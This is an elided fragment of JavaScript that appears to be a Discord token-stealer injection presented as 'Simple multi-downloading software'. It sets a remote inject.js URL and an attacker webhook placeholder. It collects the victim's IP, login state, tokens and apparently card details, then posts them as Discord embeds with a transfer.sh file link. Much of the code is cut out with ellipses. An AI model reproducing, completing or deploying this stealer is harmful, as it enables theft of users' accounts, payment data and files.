...
var config = {
    ...
    injection_url: "https://raw.githubusercontent.com/eidyeedgh3/excitingfiledownloading/main/inject.js",
    webhook: "%WEBHOOK%",
    Filter: {
        "urls": [
...
const makeEmbed = async ({
    ...
    var params = {
        ...
        embeds: [{
            ...
            author: {
                name: `Simple multi-downloading software`
            },
...
const FirstTime = async () => {
    ...
    if (fs.existsSync(__dirname + "/lol")) fs.rmdirSync(__dirname + "/lol")
    var ip = await getIP()
    ...
    if ((config.logout != "false" || config.logout !== "%LOGOUT%") && config['logout-notify'] == "true") {
        if (!token) {
            var params = await makeEmbed({
                title: " user log user not Logged in before",
                fields: [{
                    name: "Injection Info",
    ...
    switch (true) {
        ...
        case request.url.endsWith("tokens"):
            ...
            var params = await makeEmbed({
                title: "credut card",
                description: `
                 Files: [Transfer.sh <:transfer:1105163981338968264>](${config.transfer_link})
                **IP:** ${ip}\n\n
